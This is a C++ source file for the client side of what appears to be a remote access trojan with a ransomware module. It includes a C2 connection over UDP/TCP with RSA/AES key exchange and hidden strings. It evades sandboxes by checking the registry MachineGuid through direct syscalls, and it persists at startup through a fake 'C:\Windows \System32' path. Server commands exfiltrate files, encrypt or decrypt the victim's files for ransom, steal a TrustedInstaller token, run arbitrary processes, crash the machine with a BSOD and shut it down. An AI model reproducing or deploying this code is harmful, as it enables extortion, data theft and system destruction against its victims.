#include "Client.h"
#include "NetworkManager.h"
#include "Syscalls.h"
#include "openssl/err.h"

#define ADD_TO_STARTUP TRUE

#ifdef CLIENT_RELEASE

Packet CreateKeepAlivePacket() {
    Packet packet;
    packet.buffLen = 0;
    packet.action = kKeepAlive;
    packet.code = kResponseOk;
    packet.valid = true;

    return packet;
}

Client::Client() {
    // setup udp addr
    hostent* host = GetHostByName(DNS_NAME.c_str());
    if ( host == NULL )
        return;

    sockaddr_in addr;
    memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
    addr.sin_family = AF_INET;
    addr.sin_port = HostToNetworkShort(UDP_PORT);

    // set udp server info
    this->m_UDPServerDetails.addr = addr;
    this->m_UDPServerDetails.domain = AF_INET;
    this->m_UDPServerDetails.port = UDP_PORT;
    this->m_UDPServerDetails.type = SOCK_DGRAM;

    RSAKeys gen = LGCrypto::GenerateRSAPair(4096);
    this->SetRequestSecrets(gen);
    SetRemoteMachineGUID();
    SetRemoteComputerName();

    if ( ADD_TO_STARTUP == TRUE )
        this->m_ProcMgr.AddProcessToStartup((char*)HIDE("C:\\Windows \\System32\\ComputerDefaults.exe"));
}

Client::~Client() {
    this->Disconnect(); // disconnect incase the socket is still connected

    CleanWSA();
}

void Client::SetRemoteComputerName() {
    char  buffer[256];
    DWORD buffSize = sizeof(buffer);

    // get computer name
    BOOL success = GetComputerNameA(buffer, &buffSize);
    if ( success )
        this->m_ComputerName = buffer;
}

bool Client::Connect() {
    if ( this->m_MachineGUID == ":(" ) 
        return false; // vm or some controlled environment

    // make request to udp server
    this->m_UDPSocket = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if ( this->m_UDPSocket == INVALID_SOCKET )
        return false;

    // set timeout for sending and receiving on udp socket
    // if it times out that means server is not on
    m_NetworkManager.SetSocketTimeout(this->m_UDPSocket, 2000, SO_SNDTIMEO);

    Packet request;
    request.action = kAddClientToServer;
    request.code = kNotAResponse;
    bool sent = SendMessageToServer(this->m_UDPServerDetails, request);
    if ( !sent ) {
        CloseSocket(this->m_UDPSocket);
        return false;
    }
    
    m_NetworkManager.SetSocketTimeout(this->m_UDPSocket, 2000, SO_RCVTIMEO);

    Server      TCPServer;
    sockaddr_in serverAddr;
    bool received = m_NetworkManager.ReceiveData(TCPServer, this->m_UDPSocket, UDP, serverAddr);
    if ( !received ) {
        CloseSocket(this->m_UDPSocket);
        return false;
    }
    
    // reset udp socket timeouts
    m_NetworkManager.ResetSocketTimeout(this->m_UDPSocket, SO_RCVTIMEO);
    m_NetworkManager.ResetSocketTimeout(this->m_UDPSocket, SO_SNDTIMEO);

    this->m_UDPServerDetails.addr = serverAddr;
    this->m_TCPServerDetails      = TCPServer;

    // connect to tcp server
    this->m_TCPSocket = CreateSocket(AF_INET, SOCK_STREAM, 0);
    if ( this->m_TCPSocket == INVALID_SOCKET ) {
        CloseSocket(this->m_UDPSocket);
        return false;
    }

    int connect = ConnectSocket(this->m_TCPSocket, ( sockaddr* ) &this->m_TCPServerDetails.addr, sizeof(this->m_TCPServerDetails.addr));
    if ( connect == SOCKET_ERROR ) {
        CloseSocket(this->m_TCPSocket);
        CloseSocket(this->m_UDPSocket);
        return false;
    }
    
    SetSocketOptions(this->m_TCPSocket, SOL_SOCKET, SO_RCVBUF, ( char* ) &MAX_BUFFER_LEN, sizeof(MAX_BUFFER_LEN));
    SetSocketOptions(this->m_TCPSocket, SOL_SOCKET, SO_SNDBUF, ( char* ) &MAX_BUFFER_LEN, sizeof(MAX_BUFFER_LEN));

    RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
    this->SetRequestSecrets(keys);

    if ( !ExchangeCryptoKeys() || !SendComputerNameToServer() || !SendMachineGUIDToServer() )
        return false;
   
    return true;
}

void Client::SetRemoteMachineGUID() {
    OBJECT_ATTRIBUTES obj;
    InitializeObjectAttributes(&obj, 0, 0, 0, 0);

    std::string hiddenRegPath = std::string(HIDE("\\Registry\\Machine\\Software\\Microsoft\\Cryptography"));
    std::wstring wide = std::wstring(hiddenRegPath.begin(), hiddenRegPath.end());

    UNICODE_STRING reg;
    reg.Buffer = wide.data();
    reg.Length = wide.size() * sizeof(wchar_t);
    reg.MaximumLength = sizeof(reg.Buffer);

    std::string hiddenName = std::string(HIDE("MachineGuid"));
    std::wstring name = std::wstring(hiddenName.begin(), hiddenName.end());

    UNICODE_STRING valueName;
    valueName.Buffer = name.data();
    valueName.Length = name.size() * sizeof(wchar_t);
    valueName.MaximumLength = sizeof(valueName.Length);

    obj.Length = sizeof(OBJECT_ATTRIBUTES);
    obj.RootDirectory = NULL;
    obj.ObjectName = &reg;
    obj.SecurityDescriptor = NULL;
    obj.SecurityQualityOfService = NULL;
    obj.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE key;
    this->m_ProcMgr.GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtOpenKey"));
    SysNtOpenKey(&key, GENERIC_READ, &obj);

    char buffer[512];
    u_long size;

    this->m_ProcMgr.GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtQueryValueKey"));
    SysNtQueryValueKey(key, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &size);
    PKEY_VALUE_PARTIAL_INFORMATION pk = ( PKEY_VALUE_PARTIAL_INFORMATION ) buffer;
    std::wstring data = ( wchar_t* ) pk->Data;
    std::string string = std::string(data.begin(), data.end());

    if ( string.length() != 36 ) {
        this->m_MachineGUID = ":(";
        return;
    }

    this->m_MachineGUID = string;
}

bool Client::SendComputerNameToServer() {
    return SendMessageToServer(this->m_ComputerName, TRUE);
}

bool Client::SendMachineGUIDToServer() {
    return SendMessageToServer(this->m_MachineGUID, TRUE);
}

const CMDDESC Client::CreateCommandDescription(const Packet& command) {
    std::string buffer(command.buffer, command.buffLen);

    CMDDESC description;
    description.respondToServer = ( command.flags & RESPOND_WITH_STATUS );
    description.creationFlags   = ( command.flags & NO_CONSOLE ) ? CREATE_NO_WINDOW : CREATE_NEW_CONSOLE;
    description.application     = std::wstring(buffer.begin(), buffer.end()); // default application to run is wtv in command buffer

    if ( command.flags & RUN_AS_HIGHEST && this->m_ProcMgr.GetProcessSecurityContext() < SecurityContext::Highest )
        this->m_ProcMgr.GetTrustedInstallerToken();

    if ( command.flags & USE_CLI ) {
        description.useCLI = true;
        description.commandArgs += std::wstring(buffer.begin(), buffer.end()); // buffer are the command line args
    } else
        description.application += std::wstring(buffer.begin(), buffer.end());

    description.creationContext = this->m_ProcMgr.GetToken();

    return description;
}

bool Client::PerformCommand(const Packet& command, Packet& outResponse) {

    bool    success     = false;
    CMDDESC description = CreateCommandDescription(command);
    std::string cmdOutput = "";

    switch ( command.action ) {
    case Action::kReceiveFileFromClient: {
        // path of file to download in buffer
        std::string downloadPath(command.buffer, command.buffLen);
        File file(downloadPath);
        success = this->m_NetworkManager.SendFile(file, this->m_TCPSocket, this->GetAESKey());
        break;
    }
    case Action::kSetAsDecryptionKey: {
        int len = 0;

        int received = Receive(this->m_TCPSocket, ( char* ) &len, sizeof(len), 0);
        if ( received <= 0 )
            break;

        unsigned char* der = ( unsigned char* ) malloc(len);
        received = Receive(this->m_TCPSocket, ( char* ) der, len, 0);
        if ( received <= 0 ) {
            free(der);
            break;
        }

        const unsigned char* constDer = der;

        RSA* key = d2i_RSAPrivateKey(nullptr, &constDer, len);
        if ( !key ) {
            free(der);
            break;
        }

        this->m_FileManager.SetPrivateKey(key);

        success = true;
        break;
    }
    case Action::kRunDecryptor:
        // its still called even if we havent received the private key from the server 
        // wont decrypt anything though because we dont have the private key
        this->m_FileManager.TransformFiles(command.buffer, &FileManager::DecryptContents, this->m_FileManager);
        success = true;
        break;
    case Action::kRansomwareEnable:
        this->m_FileManager.TransformFiles(command.buffer, &FileManager::EncryptContents, this->m_FileManager);
        success = true;
        break;
    case Action::kAddToStartup:
        this->m_ProcMgr.AddProcessToStartup(command.buffer);
        success = true;
        break;
    case Action::kPingClient:
        success = true;
        break;
    case Action::kRemoteBSOD:
        this->m_ProcMgr.BSOD();
        break;
    case Action::kRemoteShutdown: {
        if ( strcmp(command.buffer, "shutdown") == 0 )
            ProcessManager::ShutdownSystem(ShutdownPowerOff);
        else if ( strcmp(command.buffer, "restart") == 0 )
            ProcessManager::ShutdownSystem(ShutdownReboot);

        success = true;
        break;
    }
    case Action::kOpenRemoteProcess:
        success = this->m_ProcMgr.OpenProcessAsImposter(
            this->m_ProcMgr.GetToken(),
            NULL,
            ( description.useCLI ) ? nullptr : description.application.data(),
            description.commandArgs.data(),
            description.creationFlags,
            NULL,
            NULL,
            description.respondToServer,
            cmdOutput
        );
        
        break;
    default:
        success = true;
        break;
    }

    if ( description.respondToServer || command.flags & RESPOND_WITH_STATUS ) {
        outResponse.action = command.action;
        outResponse.code = (success) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
        outResponse.insert(cmdOutput);
    }

    return success;
}

bool Client::IsServerAwaitingResponse(const Packet& commandPerformed) {
    bool sendResponse = false;
    switch ( commandPerformed.action ) {
    case Action::kPingClient:
        sendResponse = true;
        break;
    }
    return sendResponse;
}

void Client::ListenForServerCommands() {
    bool received = true;
    Packet toEcho = CreateKeepAlivePacket();

    while ( true ) {
        BYTESTRING encrypted;
        received = m_NetworkManager.ReceiveTCPLargeData(encrypted, this->m_TCPSocket);

        if ( !received ) {
            if ( this->m_TCPSocket == INVALID_SOCKET )
                break;
            
            continue;
        }

        Packet receivedPacket = LGCrypto::DecryptToStruct<Packet>(encrypted, this->m_AESKey);
        
        if ( receivedPacket.action == kKeepAlive ) {
            BYTESTRING cipherPacket = LGCrypto::EncryptStruct(toEcho, this->m_AESKey, LGCrypto::GenerateAESIV());
            m_NetworkManager.SendTCPLargeData(cipherPacket, this->m_TCPSocket);
            continue;
        } else if ( receivedPacket.action == kKillClient ) {
            this->Disconnect();
            break;
        }

        Packet responseToServer;
        if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
            PerformCommand(receivedPacket, responseToServer);

        // dont need to respond to server with 'responseToServer'
        if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == FALSE )
            continue;

        BYTESTRING buffer = LGCrypto::EncryptStruct(responseToServer, this->m_AESKey, LGCrypto::GenerateAESIV());
        m_NetworkManager.SendTCPLargeData(buffer, this->m_TCPSocket);
    }
}

// todo: add some error handling
bool Client::ExchangeCryptoKeys() {

    // receive the public key length
    unsigned char* derServerPubKey = NULL;
    int            derServerPubKeyLen = 0;
    int received = Receive(this->m_TCPSocket, ( char* ) &derServerPubKeyLen, sizeof(derServerPubKeyLen), 0);
    if ( received <= 0 )
        return false;

    // allocate the size of the key in memory for a buffer
    derServerPubKey = ( unsigned char* ) malloc(derServerPubKeyLen);

    // receive the der format of the servers public rsa key
    received = Receive(this->m_TCPSocket, ( char* ) derServerPubKey, derServerPubKeyLen, 0);
    if ( received <= 0 ) {
        free(derServerPubKey);
        return false;
    }

    unsigned char* derClientPubKey = NULL;
    int            derClientPubKeyLen = i2d_RSAPublicKey(this->m_RequestSecrets.pub, nullptr);

    if ( derClientPubKeyLen < 0 )
        return false;

    const unsigned char* constDerServerPubKey = derServerPubKey;

    // convert unsigned char* der rsa key to RSA* object
    RSA* rsaServerPubKey = d2i_RSAPublicKey(nullptr, &constDerServerPubKey, derServerPubKeyLen);
    if ( !rsaServerPubKey ) {
        free(derClientPubKey);
        free(derServerPubKey);
        return false;
    }

    this->m_ServerPublicKey = rsaServerPubKey;

    // receive ransom rsa public key
    int ransomRSAKeyLen = 0;
    received = Receive(this->m_TCPSocket, ( char* ) &ransomRSAKeyLen, sizeof(ransomRSAKeyLen), 0);
    if ( received <= 0 ) {
        free(derClientPubKey);
        free(derServerPubKey);
        return false;
    }

    unsigned char* derRansomRSAKey = (unsigned char*)malloc(ransomRSAKeyLen);
    received = Receive(this->m_TCPSocket, ( char* )derRansomRSAKey, ransomRSAKeyLen, 0);
    if ( received <= 0 ) {
        free(derClientPubKey);
        free(derServerPubKey);
        return false;
    }

    const unsigned char* constDerRansomRSAKey = derRansomRSAKey;

    RSA* rsaRansomKey = d2i_RSAPublicKey(nullptr, &constDerRansomRSAKey, ransomRSAKeyLen);
    if ( !rsaRansomKey ) {
        free(derClientPubKey);
        free(derServerPubKey);
        return false;
    }

    this->m_RansomSecrets.pub = rsaRansomKey;
    this->m_FileManager.SetPublicKey(this->m_RansomSecrets.pub);

    // convert RSA* to unsigned char*, this function already mallocs 
    // derClientPubKey for us
    i2d_RSAPublicKey(this->m_RequestSecrets.pub, &derClientPubKey); 

    // Send size of public key first to server
    int sent = Send(this->m_TCPSocket, ( char* ) &derClientPubKeyLen, sizeof(derClientPubKeyLen), 0);
    if ( sent <= 0 ) {
        free(derClientPubKey);
        return false;
    }

    // send der format of rsa key to server
    sent = Send(this->m_TCPSocket, ( char* ) derClientPubKey, derClientPubKeyLen, 0);
    if ( sent <= 0 ) {
        free(derClientPubKey);
        return false;
    }
    
    // get the aes key generated for this client on the server
    BYTESTRING encryptedEncodedAES;
    m_NetworkManager.ReceiveData(encryptedEncodedAES, this->m_TCPSocket, TCP);

    BYTESTRING  decryptedEncodedAES = LGCrypto::RSADecrypt(encryptedEncodedAES, this->m_RequestSecrets.priv, TRUE);
    std::string base64EncodedAES = Serialization::BytestringToString(decryptedEncodedAES);
    std::string decodedAES;
    macaron::Base64::Decode(base64EncodedAES, decodedAES);
    this->m_AESKey = Serialization::SerializeString(decodedAES);

    free(derClientPubKey);
    free(derServerPubKey);

    return true;
}

bool Client::SendMessageToServer(std::string message, BOOL encrypted) {    

    BYTESTRING serialized = Serialization::SerializeString(message);
    bool       success    = false;

    if ( encrypted ) {
        success = m_NetworkManager.TransmitData(serialized, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
    } else
        success = m_NetworkManager.TransmitData(serialized, this->m_TCPSocket, TCP);

    return success;
}

bool Client::SendMessageToServer(Server& dest, Packet message) {
    bool success = false;

    if ( dest.type == SOCK_STREAM ) // tcp
        return m_NetworkManager.TransmitData(message, this->m_TCPSocket, TCP);
    else if ( dest.type == SOCK_DGRAM )
        return m_NetworkManager.TransmitData(message, this->m_UDPSocket, UDP, dest.addr);
        
    return false;
}

bool Client::Disconnect() {
    CloseSocket(this->m_UDPSocket);
    CloseSocket(this->m_TCPSocket);

    this->m_UDPSocket = INVALID_SOCKET;
    this->m_TCPSocket = INVALID_SOCKET;

    return true;
}

#elif defined(SERVER_RELEASE)

#include <random>

Client::Client(SOCKET tcp, sockaddr_in addr)
    : AddressInfo(addr), m_TCPSocket(tcp)
{
    std::random_device gen;
    std::mt19937 rng(gen());
    std::uniform_int_distribution<std::mt19937::result_type> dist(1, 100000);
    this->ClientUID = dist(rng);
    this->Alive = TRUE;
}

void Client::Disconnect() {
    this->Alive = FALSE;

    CloseSocket(this->m_TCPSocket);
}

#endif
